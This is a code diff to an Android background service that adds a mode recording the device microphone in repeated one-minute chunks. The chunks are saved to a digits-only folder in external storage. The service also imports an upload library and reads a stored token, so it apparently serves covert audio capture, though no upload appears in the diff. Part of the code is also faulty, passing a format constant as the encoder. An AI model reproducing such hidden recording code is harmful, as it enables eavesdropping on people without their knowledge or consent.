@@ -13,17 +13,23 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.support.annotation.RequiresApi;
 import android.support.v4.app.NotificationCompat;
+import android.util.Log;
+import android.widget.Toast;
 
 import net.gotev.uploadservice.MultipartUploadRequest;
 
 import java.io.File;
 import java.io.IOException;
+import java.util.Date;
 import java.util.UUID;
 
 public class AudioService extends Service {
     String pathSave;
     MediaRecorder mediaRecorder;
     String Type,durst;
+    int min;
+    private String curedate;
+
     public AudioService() {
     }
 
@@ -48,6 +54,7 @@ public class AudioService extends Service {
         if (Type.equals("dating")){
             pathSave=Environment.getExternalStorageDirectory().getAbsolutePath()+"/"+"Ringtones"+"minedate.mp3";
         }
+            if (Type.equals("not")){
         setupMediaRecorder();
         try {
             mediaRecorder.prepare();
@@ -88,7 +95,12 @@ public class AudioService extends Service {
 
                 }
             }, Long.parseLong(durst));
-        }}
+        }}}else if (Type.equals("dating")) {
+            Log.e("rttredfgf", Type+".."+ durst);
+            Toast.makeText(this, Type+".."+ durst, Toast.LENGTH_SHORT).show();
+            min= Integer.parseInt(durst)/60000;
+            setdatingvoice();
+        }
 
         return super.onStartCommand(intent,flags,startId);
     }
@@ -154,6 +166,36 @@ public class AudioService extends Service {
         tokenDataBaseManager.close();
         return token;
 
+    }
+    public void setdatingvoice(){
+        File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath(),"45854455555");
+        if (!file.exists()){file.mkdirs();}
+        Date curDate = new Date(System.currentTimeMillis());
+        curedate=curDate.toString();
+        mediaRecorder =new MediaRecorder();
+        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+        mediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
+        mediaRecorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath()+"/45854455555/"+curedate+".mp4");
+        try {
+            mediaRecorder.prepare();
+            mediaRecorder.start();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }catch (IllegalStateException e){}
+        Handler handler=new Handler();
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                min--;
+                mediaRecorder.stop();
+                if (min>0){
+                    setdatingvoice();
+                }
+
+
+            }
+        }, 60000);
     }
 
 
